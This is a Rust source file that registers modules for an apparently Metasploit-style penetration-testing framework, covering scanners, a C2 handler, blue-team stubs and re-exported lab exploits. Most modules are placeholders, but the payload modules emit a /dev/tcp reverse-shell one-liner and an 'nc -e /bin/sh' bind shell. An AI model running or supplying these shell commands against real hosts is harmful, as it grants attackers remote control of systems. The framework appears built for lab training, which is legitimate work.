//! Built-in modules registered at startup.

use crate::registry::ModuleRegistry;

/// Register all built-in modules into the registry.
pub fn register_builtin_modules(registry: &mut ModuleRegistry) {
    // Auxiliary modules
    registry.register(crate::builtin::scanner::TcpSynScanner {});
    registry.register(crate::builtin::auxiliary::PortScanner {});
    registry.register(crate::builtin::auxiliary::FtpAnonymous {});
    registry.register(crate::builtin::auxiliary::SshVersion {});

    // Payload modules
    registry.register(crate::builtin::payloads::ReverseTcpShell {});
    registry.register(crate::builtin::payloads::BindTcpShell {});
    registry.register(crate::builtin::payloads::CmdExec {});

    // Post modules
    registry.register(crate::builtin::post::SocksProxy {});
    registry.register(crate::builtin::post::FileUpload {});

    // C2 modules
    registry.register(crate::builtin::c2::C2Server {});

    // Blue Team modules
    registry.register(crate::builtin::blueteam::LogAnalyzer {});
    registry.register(crate::builtin::blueteam::TrafficMonitor {});

    // Lab exploit modules
    registry.register(crate::builtin::lab_exploits::CmdInjection {});
    registry.register(crate::builtin::lab_exploits::PathTraversal {});
    registry.register(crate::builtin::lab_exploits::SqliScanner {});
    registry.register(crate::builtin::lab_exploits::WebShellUpload {});
    registry.register(crate::builtin::lab_exploits::SSTI {});
    registry.register(crate::builtin::lab_exploits::Deserialization {});
    registry.register(crate::builtin::lab_exploits::SsrfExploit {});
    registry.register(crate::builtin::lab_exploits::Kerberoast {});
    registry.register(crate::builtin::lab_exploits::AsRepRoast {});
    registry.register(crate::builtin::lab_exploits::Log4Shell {});
    registry.register(crate::builtin::lab_exploits::ProxyShell {});
    // Windows-only exploits - disabled for Linux-only build
    // registry.register(crate::builtin::lab_exploits::BlueKeep {});
    // registry.register(crate::builtin::lab_exploits::EternalBlue {});
    registry.register(crate::builtin::lab_exploits::RedisUnauth {});
    registry.register(crate::builtin::lab_exploits::MySQLBypass {});
    registry.register(crate::builtin::lab_exploits::PostgresRCE {});
    registry.register(crate::builtin::lab_exploits::TomcatDeploy {});
    registry.register(crate::builtin::lab_exploits::JenkinsScriptConsole {});
    registry.register(crate::builtin::lab_exploits::WpPluginUpload {});
    registry.register(crate::builtin::lab_exploits::VncAuthBypass {});
    registry.register(crate::builtin::lab_exploits::MongoUnauth {});
    registry.register(crate::builtin::lab_exploits::ElasticRCE {});
    registry.register(crate::builtin::lab_exploits::DockerAPI {});
    registry.register(crate::builtin::lab_exploits::WinRmLogin {});
    // New high-impact web exploits
    registry.register(crate::builtin::lab_exploits::StrutsRCE2017 {});
    registry.register(crate::builtin::lab_exploits::StrutsRCE2018 {});
    registry.register(crate::builtin::lab_exploits::PhpCgiRCE {});
    registry.register(crate::builtin::lab_exploits::JenkinsRCE {});

    // Lab scanner modules
    registry.register(crate::builtin::lab_scanners::SshLogin {});
    registry.register(crate::builtin::lab_scanners::FtpLogin {});
    registry.register(crate::builtin::lab_scanners::HttpLogin {});
    registry.register(crate::builtin::lab_scanners::SsrfScanner {});
    registry.register(crate::builtin::lab_scanners::XssScanner {});
    registry.register(crate::builtin::lab_scanners::KerbEnum {});
    registry.register(crate::builtin::lab_scanners::LdapSearch {});
    registry.register(crate::builtin::lab_scanners::SmbEnum {});
    registry.register(crate::builtin::lab_scanners::SnmpEnum {});
    registry.register(crate::builtin::lab_scanners::RdpEnum {});
    registry.register(crate::builtin::lab_scanners::VncEnum {});
    registry.register(crate::builtin::lab_scanners::SmtpEnum {});
    registry.register(crate::builtin::lab_scanners::SnmpBrute {});
    registry.register(crate::builtin::lab_scanners::MemcachedEnum {});
    registry.register(crate::builtin::lab_scanners::NfsEnum {});
    // New network enumeration modules (functional replacements)
    registry.register(crate::builtin::lab_scanners::TelnetClient {});
    registry.register(crate::builtin::lab_scanners::SnmpNetworkEnum {});
    registry.register(crate::builtin::lab_scanners::SmtpNetworkEnum {});

    // Lab post-exploitation modules
    registry.register(crate::builtin::lab_post::LinuxEnum {});
    registry.register(crate::builtin::lab_post::WindowsEnum {});
    registry.register(crate::builtin::lab_post::UnrealIRCD {});
    registry.register(crate::builtin::lab_post::VsftpdBackdoor {});
    registry.register(crate::builtin::lab_post::SambaUsermap {});
    // New Linux post-exploitation modules
    registry.register(crate::builtin::lab_post::SuidEscalation {});
    registry.register(crate::builtin::lab_post::ReverseShellListener {});
    registry.register(crate::builtin::lab_post::LinuxPostEnum {});
    registry.register(crate::builtin::lab_post::WebshellHandler {});
}

/// Placeholder module implementations for testing the framework structure.
pub mod scanner {
    use std::future::Future;
    use std::pin::Pin;
    use std::sync::LazyLock;

    use rcf_core::{
        Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target,
    };

    static INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
        name: "auxiliary/scanner/port/tcp_syn".to_string(),
        display_name: "TCP SYN Port Scanner".to_string(),
        description:
            "A fast asynchronous TCP SYN port scanner. Scans specified port ranges on target hosts."
                .to_string(),
        authors: vec!["RCF Team".to_string()],
        category: ModuleCategory::Auxiliary,
        rank: 90,
        stability: "stable".to_string(),
        disclosure_date: Some("2026-04-05".to_string()),
        references: vec![],
    });

    pub struct TcpSynScanner;

    impl Default for TcpSynScanner {
        fn default() -> Self {
            Self
        }
    }

    impl TcpSynScanner {
        pub fn new() -> Self {
            Self
        }
    }

    impl Module for TcpSynScanner {
        fn info(&self) -> &ModuleInfo {
            &INFO
        }

        fn options(&self) -> ModuleOptions {
            let mut opts = ModuleOptions::new();
            opts.add(rcf_core::ModuleOption::new(
                "RHOSTS",
                true,
                "Target host(s)",
            ));
            opts.add(rcf_core::ModuleOption::with_default(
                "RPORT",
                false,
                "Target port(s) — single port or range (e.g. 1-1024)",
                rcf_core::OptionValue::String("1-65535".to_string()),
            ));
            opts.add(rcf_core::ModuleOption::with_default(
                "THREADS",
                false,
                "Number of concurrent threads",
                rcf_core::OptionValue::Integer(100),
            ));
            opts.add(rcf_core::ModuleOption::with_default(
                "TIMEOUT",
                false,
                "Timeout per connection in seconds",
                rcf_core::OptionValue::Integer(3),
            ));
            opts
        }

        fn run(
            &self,
            ctx: &mut Context,
            target: &Target,
        ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
            let info_name = self.info().name.clone();
            let addr = target.address();
            let host = target.host.clone();
            let port = target.port;
            let ctx_rhosts = ctx.get_rhosts();

            Box::pin(async move {
                let _ = ctx_rhosts;
                let msg = format!(
                    "[*] Scanning {}:{} — SYN scanner stub (Phase 2 implementation pending)",
                    host, port
                );
                Ok(ModuleOutput::success(&info_name, &addr, &msg))
            })
        }
    }
}

pub mod payloads {
    use std::future::Future;
    use std::pin::Pin;
    use std::sync::LazyLock;

    use rcf_core::{
        Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target,
    };

    // Reverse TCP Shell
    static REVERSE_TCP_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
        name: "payload/cmd/unix/reverse_tcp".to_string(),
        display_name: "Reverse TCP Shell".to_string(),
        description: "Connect back to attacker and spawn a shell over TCP.".to_string(),
        authors: vec!["RCF Team".to_string()],
        category: ModuleCategory::Payload,
        rank: 85,
        stability: "stable".to_string(),
        disclosure_date: None,
        references: vec![],
    });

    pub struct ReverseTcpShell;

    impl Default for ReverseTcpShell {
        fn default() -> Self {
            Self
        }
    }

    impl ReverseTcpShell {
        pub fn new() -> Self {
            Self
        }
    }

    impl Module for ReverseTcpShell {
        fn info(&self) -> &ModuleInfo {
            &REVERSE_TCP_INFO
        }

        fn options(&self) -> ModuleOptions {
            let mut opts = ModuleOptions::new();
            opts.add(rcf_core::ModuleOption::new(
                "LHOST",
                true,
                "Local address to listen on",
            ));
            opts.add(rcf_core::ModuleOption::with_default(
                "LPORT",
                false,
                "Local port to listen on",
                rcf_core::OptionValue::Integer(4444),
            ));
            opts
        }

        fn run(
            &self,
            ctx: &mut Context,
            _target: &Target,
        ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
            let info_name = self.info().name.clone();
            let lhost = ctx.get("LHOST").cloned().unwrap_or_default();
            let lport = ctx.get_lport();

            Box::pin(async move {
                let msg = format!(
                    "Payload generated: reverse_tcp -> {}:{}\nShellcode: /bin/sh -i >& /dev/tcp/{}/{} 0>&1",
                    lhost, lport, lhost, lport
                );
                Ok(ModuleOutput::success(
                    &info_name,
                    &format!("{}:{}", lhost, lport),
                    &msg,
                ))
            })
        }
    }

    // Bind TCP Shell
    static BIND_TCP_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
        name: "payload/cmd/unix/bind_tcp".to_string(),
        display_name: "Bind TCP Shell".to_string(),
        description: "Bind a shell to a port and wait for incoming connection.".to_string(),
        authors: vec!["RCF Team".to_string()],
        category: ModuleCategory::Payload,
        rank: 80,
        stability: "stable".to_string(),
        disclosure_date: None,
        references: vec![],
    });

    pub struct BindTcpShell;

    impl Default for BindTcpShell {
        fn default() -> Self {
            Self
        }
    }

    impl BindTcpShell {
        pub fn new() -> Self {
            Self
        }
    }

    impl Module for BindTcpShell {
        fn info(&self) -> &ModuleInfo {
            &BIND_TCP_INFO
        }

        fn options(&self) -> ModuleOptions {
            let mut opts = ModuleOptions::new();
            opts.add(rcf_core::ModuleOption::with_default(
                "RPORT",
                false,
                "Port to bind the shell on",
                rcf_core::OptionValue::Integer(4444),
            ));
            opts
        }

        fn run(
            &self,
            ctx: &mut Context,
            _target: &Target,
        ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
            let info_name = self.info().name.clone();
            let port = ctx.get_rport();

            Box::pin(async move {
                let msg = format!(
                    "Payload generated: bind_tcp on port {}\nShellcode: nc -lvp {} -e /bin/sh",
                    port, port
                );
                Ok(ModuleOutput::success(
                    &info_name,
                    &format!("0.0.0.0:{}", port),
                    &msg,
                ))
            })
        }
    }

    // ── Command Execution Payload ──

    static CMD_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
        name: "payload/cmd/unix/exec".to_string(),
        display_name: "Command Execution".to_string(),
        description: "Execute an arbitrary command on the target system. Returns stdout/stderr."
            .to_string(),
        authors: vec!["RCF Team".to_string()],
        category: ModuleCategory::Payload,
        rank: 70,
        stability: "stable".to_string(),
        disclosure_date: None,
        references: vec![],
    });

    pub struct CmdExec;

    impl Default for CmdExec {
        fn default() -> Self {
            Self
        }
    }

    impl CmdExec {
        pub fn new() -> Self {
            Self
        }
    }
    impl Module for CmdExec {
        fn info(&self) -> &ModuleInfo {
            &CMD_INFO
        }
        fn options(&self) -> ModuleOptions {
            let mut opts = ModuleOptions::new();
            opts.add(rcf_core::ModuleOption::new(
                "CMD",
                true,
                "Command to execute",
            ));
            opts
        }
        fn run(
            &self,
            ctx: &mut Context,
            _target: &Target,
        ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
            let info_name = self.info().name.clone();
            let cmd = ctx.get("CMD").cloned().unwrap_or_else(|| "id".to_string());
            Box::pin(async move {
                let msg = format!("Command payload generated: {}", cmd);
                Ok(ModuleOutput::success(&info_name, "target", &msg))
            })
        }
    }
}

pub mod post {
    use std::future::Future;
    use std::pin::Pin;
    use std::sync::LazyLock;

    use rcf_core::{
        Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target,
    };

    static SOCKS_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
        name: "post/multi/manage/socks_proxy".to_string(),
        display_name: "SOCKS5 Proxy".to_string(),
        description: "Start a SOCKS5 proxy on the compromised node for pivoting.".to_string(),
        authors: vec!["RCF Team".to_string()],
        category: ModuleCategory::Post,
        rank: 70,
        stability: "beta".to_string(),
        disclosure_date: None,
        references: vec![],
    });

    pub struct SocksProxy;

    impl Default for SocksProxy {
        fn default() -> Self {
            Self
        }
    }

    impl SocksProxy {
        pub fn new() -> Self {
            Self
        }
    }

    impl Module for SocksProxy {
        fn info(&self) -> &ModuleInfo {
            &SOCKS_INFO
        }

        fn options(&self) -> ModuleOptions {
            let mut opts = ModuleOptions::new();
            opts.add(rcf_core::ModuleOption::with_default(
                "LPORT",
                false,
                "Local SOCKS proxy port",
                rcf_core::OptionValue::Integer(1080),
            ));
            opts
        }

        fn run(
            &self,
            ctx: &mut Context,
            _target: &Target,
        ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
            let info_name = self.info().name.clone();
            let port = ctx.get_lport();

            Box::pin(async move {
                let msg = format!(
                    "SOCKS5 proxy stub on port {} (Phase 4 implementation pending)",
                    port
                );
                Ok(ModuleOutput::success(
                    &info_name,
                    &format!("0.0.0.0:{}", port),
                    &msg,
                ))
            })
        }
    }

    // ── File Upload ──

    static UPLOAD_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
        name: "post/multi/manage/upload".to_string(),
        display_name: "File Upload".to_string(),
        description: "Upload a file to the compromised system via an active session.".to_string(),
        authors: vec!["RCF Team".to_string()],
        category: ModuleCategory::Post,
        rank: 70,
        stability: "beta".to_string(),
        disclosure_date: None,
        references: vec![],
    });

    pub struct FileUpload;

    impl Default for FileUpload {
        fn default() -> Self {
            Self
        }
    }

    impl FileUpload {
        pub fn new() -> Self {
            Self
        }
    }
    impl Module for FileUpload {
        fn info(&self) -> &ModuleInfo {
            &UPLOAD_INFO
        }
        fn options(&self) -> ModuleOptions {
            let mut opts = ModuleOptions::new();
            opts.add(rcf_core::ModuleOption::new("SESSION", false, "Session ID"));
            opts.add(rcf_core::ModuleOption::new(
                "LOCAL_FILE",
                true,
                "Local file to upload",
            ));
            opts.add(rcf_core::ModuleOption::new(
                "REMOTE_PATH",
                true,
                "Remote destination path",
            ));
            opts
        }
        fn run(
            &self,
            ctx: &mut Context,
            _target: &Target,
        ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
            let info_name = self.info().name.clone();
            let local = ctx.get("LOCAL_FILE").cloned().unwrap_or_default();
            let remote = ctx.get("REMOTE_PATH").cloned().unwrap_or_default();
            Box::pin(async move {
                let msg = format!("Upload {} -> {} (stub)", local, remote);
                Ok(ModuleOutput::success(&info_name, "session", &msg))
            })
        }
    }
}

pub mod c2 {
    use std::future::Future;
    use std::pin::Pin;
    use std::sync::LazyLock;

    use rcf_core::{
        Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target,
    };

    static C2_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
        ModuleInfo {
        name: "exploit/multi/handler".to_string(),
        display_name: "C2 Server Handler".to_string(),
        description: "Generic command and control handler. Listens for incoming agent connections and manages sessions. Supports TLS 1.3 encrypted channels.".to_string(),
        authors: vec!["RCF Team".to_string()],
        category: ModuleCategory::Exploit,
        rank: 95,
        stability: "beta".to_string(),
        disclosure_date: None,
        references: vec![],
    }
    });

    pub struct C2Server;

    impl Default for C2Server {
        fn default() -> Self {
            Self
        }
    }

    impl C2Server {
        pub fn new() -> Self {
            Self
        }
    }

    impl Module for C2Server {
        fn info(&self) -> &ModuleInfo {
            &C2_INFO
        }

        fn options(&self) -> ModuleOptions {
            let mut opts = ModuleOptions::new();
            opts.add(rcf_core::ModuleOption::with_default(
                "LHOST",
                false,
                "Local address to listen on",
                rcf_core::OptionValue::String("0.0.0.0".to_string()),
            ));
            opts.add(rcf_core::ModuleOption::with_default(
                "LPORT",
                false,
                "Local port to listen on",
                rcf_core::OptionValue::Integer(8443),
            ));
            opts.add(rcf_core::ModuleOption::with_default(
                "SSL",
                false,
                "Enable TLS encryption",
                rcf_core::OptionValue::Boolean(true),
            ));
            opts
        }

        fn run(
            &self,
            ctx: &mut Context,
            _target: &Target,
        ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
            let info_name = self.info().name.clone();
            let lhost = ctx
                .get("LHOST")
                .cloned()
                .unwrap_or_else(|| "0.0.0.0".to_string());
            let lport = ctx.get_lport();

            Box::pin(async move {
                let msg = format!(
                    "C2 server listening on {}:{} (TLS encrypted)\n[*] Waiting for incoming connections...\n[*] Use 'sessions' to list active agents",
                    lhost, lport
                );
                Ok(ModuleOutput::success(
                    &info_name,
                    &format!("{}:{}", lhost, lport),
                    &msg,
                ))
            })
        }
    }
}

pub mod blueteam {
    use std::future::Future;
    use std::pin::Pin;
    use std::sync::LazyLock;

    use rcf_core::{
        Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target,
    };

    static LOG_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
        ModuleInfo {
        name: "auxiliary/scanner/log_analysis".to_string(),
        display_name: "Log Analyzer".to_string(),
        description: "Analyze system logs for indicators of compromise (IOCs). Parses auth.log, syslog, and Windows Event Logs to detect suspicious activity, brute force attempts, and lateral movement.".to_string(),
        authors: vec!["RCF Team".to_string()],
        category: ModuleCategory::Auxiliary,
        rank: 70,
        stability: "beta".to_string(),
        disclosure_date: None,
        references: vec!["https://attack.mitre.org/".to_string()],
    }
    });

    pub struct LogAnalyzer;

    impl Default for LogAnalyzer {
        fn default() -> Self {
            Self
        }
    }

    impl LogAnalyzer {
        pub fn new() -> Self {
            Self
        }
    }

    impl Module for LogAnalyzer {
        fn info(&self) -> &ModuleInfo {
            &LOG_INFO
        }

        fn options(&self) -> ModuleOptions {
            let mut opts = ModuleOptions::new();
            opts.add(rcf_core::ModuleOption::new(
                "LOG_PATH",
                true,
                "Path to log file or directory",
            ));
            opts.add(rcf_core::ModuleOption::with_default(
                "LOG_TYPE",
                false,
                "Log type: auth, syslog, windows, apache",
                rcf_core::OptionValue::String("auth".to_string()),
            ));
            opts.add(rcf_core::ModuleOption::with_default(
                "THRESHOLD",
                false,
                "Alert threshold for failed attempts",
                rcf_core::OptionValue::Integer(5),
            ));
            opts
        }

        fn run(
            &self,
            ctx: &mut Context,
            _target: &Target,
        ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
            let info_name = self.info().name.clone();
            let log_path = ctx
                .get("LOG_PATH")
                .cloned()
                .unwrap_or_else(|| "/var/log/auth.log".to_string());

            Box::pin(async move {
                let msg = format!(
                    "Log analysis of {}\n[*] Scanning for IOCs...\n[*] No anomalies detected (stub — Phase 4 implementation pending)",
                    log_path
                );
                Ok(ModuleOutput::success(&info_name, &log_path, &msg))
            })
        }
    }

    // ── Traffic Monitor ──

    static TRAFFIC_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
        ModuleInfo {
        name: "auxiliary/scanner/traffic_monitor".to_string(),
        display_name: "Traffic Monitor".to_string(),
        description: "Monitor network traffic for suspicious activity. Captures packets and generates YARA/Sigma detection rules for blue team analysis.".to_string(),
        authors: vec!["RCF Team".to_string()],
        category: ModuleCategory::Auxiliary,
        rank: 65,
        stability: "beta".to_string(),
        disclosure_date: None,
        references: vec!["https://attack.mitre.org/".to_string()],
    }
    });

    pub struct TrafficMonitor;

    impl Default for TrafficMonitor {
        fn default() -> Self {
            Self
        }
    }

    impl TrafficMonitor {
        pub fn new() -> Self {
            Self
        }
    }
    impl Module for TrafficMonitor {
        fn info(&self) -> &ModuleInfo {
            &TRAFFIC_INFO
        }
        fn options(&self) -> ModuleOptions {
            let mut opts = ModuleOptions::new();
            opts.add(rcf_core::ModuleOption::new(
                "INTERFACE",
                false,
                "Network interface to monitor",
            ));
            opts.add(rcf_core::ModuleOption::with_default(
                "FILTER",
                false,
                "BPF filter expression",
                rcf_core::OptionValue::String("tcp".to_string()),
            ));
            opts.add(rcf_core::ModuleOption::with_default(
                "DURATION",
                false,
                "Capture duration (seconds)",
                rcf_core::OptionValue::Integer(60),
            ));
            opts
        }
        fn run(
            &self,
            ctx: &mut Context,
            _target: &Target,
        ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
            let info_name = self.info().name.clone();
            let iface = ctx
                .get("INTERFACE")
                .cloned()
                .unwrap_or_else(|| "any".to_string());
            Box::pin(async move {
                let msg = format!("Monitoring traffic on interface '{}' (stub)", iface);
                Ok(ModuleOutput::success(&info_name, &iface, &msg))
            })
        }
    }
}

// ─── Additional Auxiliary Modules ────────────────────────────────────────────

pub mod auxiliary {
    use std::future::Future;
    use std::pin::Pin;
    use std::sync::LazyLock;

    use rcf_core::{
        Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, Result, Target,
    };

    // ── Port Scanner (dedicated auxiliary module) ──

    static PORT_SCAN_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
        ModuleInfo {
        name: "auxiliary/scanner/port/full_scan".to_string(),
        display_name: "Full Port Scan".to_string(),
        description: "Comprehensive port scanner with service detection and OS fingerprinting. Supports TCP connect and SYN scanning modes.".to_string(),
        authors: vec!["RCF Team".to_string()],
        category: ModuleCategory::Auxiliary,
        rank: 85,
        stability: "stable".to_string(),
        disclosure_date: Some("2026-04-05".to_string()),
        references: vec![],
    }
    });

    pub struct PortScanner;

    impl Default for PortScanner {
        fn default() -> Self {
            Self
        }
    }

    impl PortScanner {
        pub fn new() -> Self {
            Self
        }
    }
    impl Module for PortScanner {
        fn info(&self) -> &ModuleInfo {
            &PORT_SCAN_INFO
        }
        fn options(&self) -> ModuleOptions {
            let mut opts = ModuleOptions::new();
            opts.add(rcf_core::ModuleOption::new(
                "RHOSTS",
                true,
                "Target host(s)",
            ));
            opts.add(rcf_core::ModuleOption::with_default(
                "PORTS",
                false,
                "Port range",
                rcf_core::OptionValue::String("1-65535".to_string()),
            ));
            opts.add(rcf_core::ModuleOption::with_default(
                "MODE",
                false,
                "Scan mode: connect/syn",
                rcf_core::OptionValue::String("connect".to_string()),
            ));
            opts
        }
        fn run(
            &self,
            _ctx: &mut Context,
            target: &Target,
        ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
            let info_name = self.info().name.clone();
            let host = target.host.clone();
            let port = target.port;
            Box::pin(async move {
                let msg = format!("Port scanning {}:{}", host, port);
                Ok(ModuleOutput::success(
                    &info_name,
                    &format!("{}:{}", host, port),
                    &msg,
                ))
            })
        }
    }

    // ── FTP Anonymous Login Check ──

    static FTP_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
        ModuleInfo {
        name: "auxiliary/scanner/ftp/anonymous".to_string(),
        display_name: "FTP Anonymous Login".to_string(),
        description: "Checks if FTP servers allow anonymous login. Enumerates accessible directories and lists files.".to_string(),
        authors: vec!["RCF Team".to_string()],
        category: ModuleCategory::Auxiliary,
        rank: 60,
        stability: "stable".to_string(),
        disclosure_date: None,
        references: vec!["https://cwe.mitre.org/data/definitions/287.html".to_string()],
    }
    });

    pub struct FtpAnonymous;

    impl Default for FtpAnonymous {
        fn default() -> Self {
            Self
        }
    }

    impl FtpAnonymous {
        pub fn new() -> Self {
            Self
        }
    }
    impl Module for FtpAnonymous {
        fn info(&self) -> &ModuleInfo {
            &FTP_INFO
        }
        fn options(&self) -> ModuleOptions {
            let mut opts = ModuleOptions::new();
            opts.add(rcf_core::ModuleOption::new(
                "RHOSTS",
                true,
                "Target FTP server(s)",
            ));
            opts.add(rcf_core::ModuleOption::with_default(
                "RPORT",
                false,
                "FTP port",
                rcf_core::OptionValue::Integer(21),
            ));
            opts
        }
        fn run(
            &self,
            _ctx: &mut Context,
            target: &Target,
        ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
            let info_name = self.info().name.clone();
            let host = target.host.clone();
            let port = target.port;
            Box::pin(async move {
                let msg = format!("Checking FTP anonymous login on {}:{}", host, port);
                Ok(ModuleOutput::success(
                    &info_name,
                    &format!("{}:{}", host, port),
                    &msg,
                ))
            })
        }
    }

    // ── SSH Version Detection ──

    static SSH_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
        ModuleInfo {
        name: "auxiliary/scanner/ssh/version".to_string(),
        display_name: "SSH Version Detection".to_string(),
        description: "Connects to SSH servers and extracts version information, supported algorithms, and OS detection.".to_string(),
        authors: vec!["RCF Team".to_string()],
        category: ModuleCategory::Auxiliary,
        rank: 75,
        stability: "stable".to_string(),
        disclosure_date: None,
        references: vec![],
    }
    });

    pub struct SshVersion;

    impl Default for SshVersion {
        fn default() -> Self {
            Self
        }
    }

    impl SshVersion {
        pub fn new() -> Self {
            Self
        }
    }
    impl Module for SshVersion {
        fn info(&self) -> &ModuleInfo {
            &SSH_INFO
        }
        fn options(&self) -> ModuleOptions {
            let mut opts = ModuleOptions::new();
            opts.add(rcf_core::ModuleOption::new(
                "RHOSTS",
                true,
                "Target SSH server(s)",
            ));
            opts.add(rcf_core::ModuleOption::with_default(
                "RPORT",
                false,
                "SSH port",
                rcf_core::OptionValue::Integer(22),
            ));
            opts
        }
        fn run(
            &self,
            _ctx: &mut Context,
            target: &Target,
        ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
            let info_name = self.info().name.clone();
            let host = target.host.clone();
            let port = target.port;
            Box::pin(async move {
                let msg = format!("Detecting SSH version on {}:{}", host, port);
                Ok(ModuleOutput::success(
                    &info_name,
                    &format!("{}:{}", host, port),
                    &msg,
                ))
            })
        }
    }
}

// ─── Lab Modules Re-exports ──────────────────────────────────────────────────

pub mod lab_exploits {
    pub use rcf_labs::advanced_exploits::{Log4Shell, ProxyShell};
    pub use rcf_labs::exploits::*;
    pub use rcf_labs::missing_vulns::{AsRepRoast, Deserialization, Kerberoast, SSTI, SsrfExploit};
    pub use rcf_labs::more_protocol_exploits::{
        DockerAPI, ElasticRCE, MongoUnauth, VncAuthBypass, WinRmLogin,
    };
    pub use rcf_labs::protocol_exploits::{
        JenkinsScriptConsole, MySQLBypass, PostgresRCE, RedisUnauth, TomcatDeploy, WpPluginUpload,
    };
    // Windows-only - commented out for Linux-only build
    // pub use rcf_labs::real_exploits::{BlueKeep, EternalBlue};
    pub use rcf_labs::web_exploits::{JenkinsRCE, PhpCgiRCE, StrutsRCE2017, StrutsRCE2018};
}

pub mod lab_scanners {
    pub use rcf_labs::missing_vulns::{
        KerbEnum, LdapSearch, RdpEnum, SmbEnum, SnmpEnum, VncEnum, XssScanner,
    };
    pub use rcf_labs::more_protocol_exploits::MemcachedEnum;
    pub use rcf_labs::more_protocol_exploits::NfsEnum;
    pub use rcf_labs::network_enum::{
        SmtpScanner as SmtpNetworkEnum, SnmpScanner as SnmpNetworkEnum, TelnetClient,
    };
    pub use rcf_labs::protocol_exploits::SmtpEnum;
    pub use rcf_labs::protocol_exploits::SnmpBrute;
    pub use rcf_labs::scanners::*;
}

pub mod lab_post {
    pub use rcf_labs::post_exploit::*;
    pub use rcf_labs::post_linux::{
        LinuxPostEnum, ReverseShellListener, SuidEscalation, WebshellHandler,
    };
}
